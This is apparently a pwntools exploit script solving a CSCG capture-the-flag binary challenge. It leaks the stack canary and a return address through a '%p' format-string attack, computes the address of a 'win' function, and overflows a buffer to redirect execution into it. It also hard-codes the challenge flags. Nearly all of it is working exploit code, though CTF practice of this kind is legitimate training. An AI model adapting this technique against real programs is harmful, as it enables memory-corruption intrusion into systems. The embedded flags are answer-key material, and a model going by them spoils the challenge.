from pwn import *

p = process("./pwn2")
# p = remote("192.168.0.12", 9101)
# p = remote("hax1.allesctf.net", 9101)

print(p.recvuntil("Enter the password of stage 1:"))
# print(p.sendline("CSCG{NOW_PRACTICE_MORE}"))
print(p.sendline("CSCG{THIS_IS_TEST_FLAG}"))

print(p.recvuntil("Enter your witch name:"))
format_str = "%p|" * 64
print(format_str)
p.sendline(format_str)


LEAKS = p.recvuntil("enter your magic spell:").split("|")
# for i,a in enumerate(LEAKS[1:]):
#   print '%2d -> %s' % (i + 1, a)

# we leak the stack canary with the format string exploit
canary = int(LEAKS[38], 16)
log.info(LEAKS[38])

# we leak the return address which is an instruction inside the main function
MAIN=int(LEAKS[40], 16)

# the offset between the leaked instruction and the main function is constant
WIN_OFFSET = 0x231
WIN = MAIN - WIN_OFFSET

WIN_RET_OFFSET = 0x36
WIN_RET = WIN + WIN_RET_OFFSET

# next challenge uses cyclic() :)
PADDING = "A" * 3 + p64(0) * 31

p.sendline("Expelliarmus\x00" + PADDING + p64(canary) + p64(0) + p64(WIN_RET) + p64(WIN))
p.interactive()
# flag! -> CSCG{NOW_GET_VOLDEMORT}
